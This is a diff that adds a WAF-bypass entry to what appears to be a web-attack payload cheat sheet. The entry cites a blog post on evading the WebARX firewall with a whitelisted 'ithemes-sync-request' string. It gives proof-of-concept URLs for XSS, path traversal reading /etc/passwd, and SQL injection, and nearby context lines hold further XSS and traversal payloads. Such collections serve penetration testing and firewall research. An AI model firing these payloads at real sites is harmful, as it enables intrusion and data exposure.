@@ -3707,6 +3707,20 @@ http://host.com/test.asp?file=.%./bla.txt
 ```
 <a69/onauxclick=open&#40&#41>rightclickhere
 ```
+- [Bypassing All Protections Using A Whitelist String](https://osandamalith.com/2019/10/12/bypassing-the-webarx-web-application-firewall-waf/) by [@Osanda Malith](https://twitter.com/OsandaMalith)
+
+    - XSS PoC
+    ```
+    http://host.com/?vulnparam=<script>alert()</script>&ithemes-sync-request
+    ```
+    - LFI PoC
+    ```
+    http://host.com/?vulnparam=../../../../../etc/passwd&ithemes-sync-request
+    ```
+    - SQLi PoC
+    ```
+    http://host.com/?vulnparam=1%20unionselect%20@@version,2--&ithemes-sync-request
+    ```
 
 ### WebKnight
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
